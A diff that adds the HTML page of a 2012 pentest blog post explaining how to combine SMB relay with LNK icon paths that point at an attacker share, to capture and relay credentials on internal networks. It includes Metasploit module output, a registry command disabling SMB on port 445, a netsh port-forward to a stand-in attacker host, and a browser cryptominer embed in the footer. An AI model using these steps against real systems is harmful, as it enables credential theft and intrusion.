@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> MS08_068 &#43; MS10_046 = FUN UNTIL 2018 &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/">MS08_068 &#43; MS10_046 = FUN UNTIL 2018</a></h1>
+            <span class="post-date">Feb 11, 2012 </span>
+            <div class="post-content">
+                
+
+<p>*<strong><em>TL;DR:</em></strong>* SMB Relay + LNK UNC icons = internal pentest pwnage</p>
+
+<p>I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.</p>
+
+<p><strong>MS08_068:</strong> <a href="http://www.cvedetails.com/cve/CVE-2008-4037/">http://www.cvedetails.com/cve/CVE-2008-4037/</a></p>
+
+<p>In 2008, Microsoft released MS08_068 which patched the &ldquo;SMB Relay&rdquo; attack. To boil this down, an attacker gets a victim to attempt to authenticate to an attacker controlled box. The attack delays its responses to the victim and replays the important parts of the authentication that the victim sent back at the victim. You can find out a lot more about this vulnerability here: <a href="https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay">https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay</a></p>
+
+<p>One thing to take away from that post is that the patch stops Attacker &lt;=&gt; Victim, but does not / cannot fix Victim &lt;=&gt; Attacker &lt;=&gt; <strong>Victim2</strong> (use authentication from Victim to replay to Victim2)</p>
+
+<p><strong>MS10_046:</strong> <a href="http://www.cvedetails.com/cve/CVE-2010-2568/">http://www.cvedetails.com/cve/CVE-2010-2568/</a></p>
+
+<p>In 2010, Microsoft released MS10_046 which patched the Stuxnet LNK vulnerability where a malicious DLL could be loaded (locally or remotely over WebDAV) using the path of the shortcut&rsquo;s icon reference. LNK files are Windows shortcut files that allow the icons of the files to be changed much more dynamically than any other file type (Right click a shortcut, go to Properties, and just simply click the &lsquo;Change Icon&rsquo; button). I could certainly be wrong here, but I believe all Microsoft patched was the ability to use this feature to load the DLLs via a certain Control Panel object. Which leaves the ability to load shortcut (LNK) icons from wherever we wish. ;-)</p>
+
+<p><strong>The Setup:</strong></p>
+
+<p>If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine&rsquo;s IP and use SMB_Relay to replay those credentials to a system in which we&rsquo;ve identified by one means or another as an &lsquo;important&rsquo; host to get on.</p>
+
+<p>Attacker uploads malicious LNK file to network share on <strong>FILE SHARE</strong></p>
+
+<p>Victim views it on <strong>WORKSTATION</strong> that initiates an connection to <strong>ATTACKER</strong></p>
+
+<p>Attacker relays those authentication attempts to <strong>FILE SHARE</strong>, gaining code execution if &lsquo;Victim&rsquo; is an admin on <strong>FILE SHARE</strong></p>
+
+<p>If not, then NetNTLM are still visible in the logs and can be attempted to crack, or just wait for more people to view the LNK file on the public share, and hope that an admin comes by at some point.</p>
+
+<p>Your mileage will vary based on where you put the LNK file.</p>
+
+<p><strong>The Video:</strong></p>
+
+<p><center><iframe align=center width="560" height="315" src="//www.youtube.com/embed/FxekUPY5ojU" frameborder="0" allowfullscreen></iframe></center></p>
+
+<p>I have created a post module to automate the process of creating and uploading the LNK file (so you don&rsquo;t have to have a Windows box lying around). Here it is in action:</p>
+
+<pre><code>Module options (post/windows/escalate/droplnk):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   ICONFILENAME  icon.png         yes       File name on LHOST's share
+   LHOST         192.168.2.16     yes       Host listening for incoming SMB/WebDAV traffic
+   LNKFILENAME   Words.lnk        yes       Shortcut's filename
+   SESSION       1                yes       The session to run this module on.
+   SHARENAME     share1           yes       Share name on LHOST
+
+2012-02-11 07:17:19 +0000 2 1 post(droplnk) &gt; run
+
+[*] Creating evil LNK
+[*] Done. Writing to disk - C:\DocuMe~1\Administrator\Words.lnk
+[*] Done. Wait for evil to happen..
+[*] Post module execution completed
+</code></pre>
+
+<p>You can find the code here:</p>
+
+<p><a href="https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb">https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb</a></p>
+
+<p><strong>Going forward:</strong></p>
+
+<p>Obviously this isn&rsquo;t so effective remotely out of the box and there currently isn&rsquo;t a SMB_Relay for WebDAV (although I&rsquo;m guessing that would work). However I was able to construct a crude way getting smb_relaying working using some pretty loud system changes to an exploited host:</p>
+
+<ul>
+<li><strong>Step 1</strong>: Disable SMB on Port 445 (it will still operate on 139 as it is a failover), this setting requires a reboot to take effect and can be done using the following command:<br />
+
+<ul>
+<li><code>reg add HKLM\System\CurrentControlSet\Services\NetBTParameters /v SMBDeviceEnabled /t REG_DWORD /d 0</code></li>
+</ul></li>
+<li><strong>Step 2</strong>: Port forward the traffic out to your remote attacker host over a port that is allowed out, used 80:
+
+<ul>
+<li><code>netsh int portproxy v4tov4 listenport=445 connectaddress=the.bad.guy.com connectport=80</code></li>
+</ul></li>
+<li><strong>Step 3</strong>: Set up SMB_Relay listening on that port on your attacker with a route in meterpreter to send all relayed authentication through your meterpreter session into and at the targeted host.</li>
+</ul>
+
+<p>These steps can get you noticed in almost every way, so it&rsquo;s not recommended, I just did it as a PoC. I mean how cool is it to remotely exploit SMB vulns ;-)</p>
+
+<p>The other thing is, administrators are becoming much more rare as years move along and people use lower priv users for their daily tasks, so there are currently feature requests in to the Metasploit project to make it so when you get SMB_Relay correctly forwarding good credentials, even if they aren&rsquo;t admin and you cannot get code execution it would be nice to be able to go through the files that person has access to on the targeted system / file share. A final pipe dream of this post is to have a multi-threaded smb_relay that 2, 3 or even 10 servers can be targeted with the relayed authentication.</p>
+
+<p>just saying&rsquo;…. /me nudges the Metasploit devs…</p>
+
+<h3 id="references">References:</h3>
+
+<h4 id="smb-relay-references">SMB_Relay References:</h4>
+
+<ul>
+<li>&ldquo;Initial?&rdquo; release in 2003 - <a href="http://www.xfocus.net/articles/200305/smbrelay.html">http://www.xfocus.net/articles/200305/smbrelay.html</a></li>
+<li>Microsoft advisory - <a href="http://technet.microsoft.com/en-us/security/bulletin/ms08-068">http://technet.microsoft.com/en-us/security/bulletin/ms08-068</a></li>
+<li>Metasploit blog post - <a href="https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay">https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay</a></li>
+<li>Metasploit module - <a href="http://www.metasploit.com/modules/exploit/windows/smb/smb_relay">http://www.metasploit.com/modules/exploit/windows/smb/smb_relay</a></li>
+</ul>
+
+<h4 id="lnk-dll-loader-references">LNK DLL Loader References:</h4>
+
+<ul>
+<li>Microsoft advisory - <a href="http://technet.microsoft.com/en-us/security/advisory/2286198">http://technet.microsoft.com/en-us/security/advisory/2286198</a></li>
+<li>Metasploit blog post - <a href="https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening">https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening</a></li>
+<li>Some of HDM&rsquo;s research - <a href="https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws">https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws</a></li>
+<li>ISS&rsquo;s advisory - <a href="http://blogs.iss.net/archive/remotedllpreloadingv.html">http://blogs.iss.net/archive/remotedllpreloadingv.html</a></li>
+<li>Metasploit module - <a href="http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader">http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader</a></li>
+<li>Video of the module in action - <a href="http://www.commonexploits.com/?p=151">http://www.commonexploits.com/?p=151</a></li>
+</ul>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
